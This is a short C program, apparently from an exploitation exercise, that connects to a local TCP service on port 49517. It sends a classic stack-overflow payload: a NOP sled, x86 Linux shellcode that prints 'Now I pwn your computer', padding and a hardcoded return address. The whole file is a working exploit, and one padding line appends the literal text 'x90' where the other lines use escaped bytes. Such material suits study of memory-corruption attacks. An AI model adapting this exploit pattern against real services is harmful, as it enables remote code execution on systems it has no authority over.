/* tcpclient.c */

#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netdb.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>


int main()

{

        int sock, bytes_recieved;  
        char send_data[2000],recv_data[1024];
        struct hostent *host;
        struct sockaddr_in server_addr;  

        host = gethostbyname("127.0.0.1");

        if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
            perror("Socket");
            exit(1);
        }

        server_addr.sin_family = AF_INET;     

        server_addr.sin_port = htons(49517);   
        server_addr.sin_addr = *((struct in_addr *)host->h_addr);
        bzero(&(server_addr.sin_zero),8); 

        if (connect(sock, (struct sockaddr *)&server_addr,
                    sizeof(struct sockaddr)) == -1) 
        {
            perror("Connect");
            exit(1);
        }



                   

           strcpy(send_data,"\x90\x90\x90\x90\x90");
		int i;
	for (i =0; i <= 991; i++) strcat(send_data,"\x90");

	strcat(send_data,"\xeb\x19\x31\xc0\x31\xdb\x31\xd2\x31\xc9\xb0\x04\xb3\x01\x59\xb2\x17\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xe2\xff\xff\xff\x4e\x6f\x77\x20\x49\x20\x70\x77\x6e\x20\x79\x6f\x75\x72\x20\x63\x6f\x6d\x70\x75\x74\x65\x72");
	for (i =0; i <= 3; i++) strcat(send_data,"x90");

	strcat(send_data,"\x2c\xd4\xff\xff");
	strcat(send_data,"\n");
           

           send(sock,send_data,strlen(send_data), 0); 









return 0;
}

